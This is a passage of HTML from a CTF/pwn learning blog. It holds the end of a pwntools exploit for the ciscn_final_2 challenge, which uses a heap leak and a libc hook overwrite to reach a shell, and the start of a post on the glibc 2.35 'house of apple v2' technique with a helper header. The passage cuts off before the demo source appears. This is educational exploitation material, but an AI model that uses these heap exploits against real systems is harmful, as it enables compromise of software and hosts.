class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_final_2&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;glibc_run&#x27;, &#x27;2.27&#x27;, &#x27;./ciscn_final_2&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27552</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_pid</span>(<span class="params">name</span>):</span><br><span class="line">    pid_list = []</span><br><span class="line">    processes = os.popen(<span class="string">&#x27;ps -ef | grep %s&#x27;</span> % name)</span><br><span class="line">    process_info = processes.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> process_info.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]:</span><br><span class="line">        j = re.split(<span class="string">&#x27; +&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">7</span>] == name:</span><br><span class="line">            pid_list.append(<span class="built_in">int</span>(j[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> pid_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">kind, value</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(kind).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;your inode number:&#x27;</span>, <span class="built_in">str</span>(value).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">kind</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(kind).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">kind</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(kind).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>(<span class="params">content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;what do you want to say at last? &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x12345678</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x12345678</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">heap_lsw = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> heap_lsw &lt; <span class="number">0</span>:</span><br><span class="line">	heap_lsw += <span class="number">65536</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_lsw))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, heap_lsw - <span class="number">0xC0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xB1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">libc_base_lsdw = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> libc_base_lsdw &lt; <span class="number">0</span>:</span><br><span class="line">	libc_base_lsdw += <span class="number">0x1_0000_0000</span></span><br><span class="line">libc_base_lsdw -= <span class="number">0x3ebca0</span></span><br><span class="line">__free_hook = libc_base_lsdw + <span class="number">0x3ed8e8</span></span><br><span class="line">_IO_2_1_stdin_ = libc_base_lsdw + <span class="number">0x3eba00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base_lsdw))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, (_IO_2_1_stdin_ &amp; <span class="number">0xFFFF</span>) + <span class="number">112</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x12345678</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">quit(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(get_process_pid(&quot;./ciscn_final_2&quot;))</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">glibc 2.35 pwn——house of apple v2 示例程序</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-20 00:14:03 / 修改时间：00:14:51" itemprop="dateCreated datePublished" datetime="2023-03-20T00:14:03+08:00">2023-03-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>31k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>28 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>house of apple v2与v1不同，可以直接控制程序执行流，获得shell。<br />
主要参考资料：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">传送门</a></p>
<p>v2有多种程序执行路径，每一条执行路径对于伪造的<code>FILE</code>结构体、<code>_wide_data</code>结构体都有不同的要求。在学习本漏洞时要学会举一反三，只要了解了基本原理，这些路径实际上我们是可以自己推出来的。</p>
<p><strong>小建议：读者可以使用IDA打开ubuntu 22.04本机的libc并保存i64文件，由于libc文件中保存的<code>_IO_jump_t</code>结构体中有很多函数都没有符号，因此在学习FSOP的过程中可以匹配<code>_IO_jump_t</code>结构体本身的名字以及其中含有的函数名，这样在下一次查看时就不需要再去推断某一个位置函数的名字了。musl libc同理。</strong></p>
<p>后续笔者会将自己写的所有演示代码上传到github供各位读者学习。</p>
<p>头文件util.h：含说明文字的颜色输出、获取libc基地址等实用函数（后续可能会进一步完善，添加新的函数与功能）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-3-16.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MY_HOW2HEAP_UTIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MY_HOW2HEAP_UTIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_BLACK_HEAD        <span class="string">&quot;\033[1;30m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_RED_HEAD          <span class="string">&quot;\033[1;31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_GREEN_HEAD        <span class="string">&quot;\033[1;32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_YELLOW_HEAD       <span class="string">&quot;\033[1;33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_BLUE_HEAD         <span class="string">&quot;\033[1;34m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_PURPLE_HEAD       <span class="string">&quot;\033[1;35m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_DARK_GREEN_HEAD   <span class="string">&quot;\033[1;36m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_WHITE_HEAD        <span class="string">&quot;\033[1;37m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> victim[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_libc_base</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">size_t</span>)<span class="built_in">puts</span> - <span class="number">0x80ED0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//MY_HOW2HEAP_UTIL_H</span></span></span><br></pre></td></tr></table></figure>
<p>源文件house_of_apple_2.c：主要演示代码，通过修改宏定义可选择使用3条执行路径中的1条。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span 